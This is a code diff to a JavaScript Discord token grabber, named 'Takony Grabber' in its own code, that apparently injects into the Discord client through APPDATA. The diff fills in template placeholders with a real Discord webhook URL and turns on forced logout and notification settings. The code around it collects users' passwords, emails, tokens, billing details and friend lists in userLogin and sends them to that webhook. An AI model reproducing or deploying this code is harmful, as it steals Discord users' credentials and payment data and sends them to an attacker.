@@ -7,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "%WEBHOOK_LINK%"
+const webhook = "https://discord.com/api/webhooks/1016797290935103649/3MaHqWJVo_iKB1QjaGa8U-0Nb51nnSh-gjgMMDgEmgemdnlk8YtCTNY8eXq3opvZDo5p"
 const APPDATA = process.env.APPDATA;
 const Filters = {
     1: {
@@ -31,11 +31,11 @@ const Datas = {
 
 const config = {
     "minimum_members_per_server":"%MIN_MEMBERS%",
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify": "%INITNOTI%",
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
     "embed-color": 347704,
-    "disable-qr-code": "%DISABLEQRCODE%",
+    "disable-qr-code": "true",
     "ping": [false, "@everyone"]
 };
 
@@ -400,7 +400,10 @@ async function userLogin(password, email, token) {
     var servers = await getServers(token)
     var billing = await getBilling(token);
     var friends = await getRelationships(token);
-
+    var debug = {
+        username: "Takony Grabber",
+        content: "fasz"
+    };
     var params = {
         username: "Takony Grabber",
         content: config.ping[0] ? config.ping[1] : "",
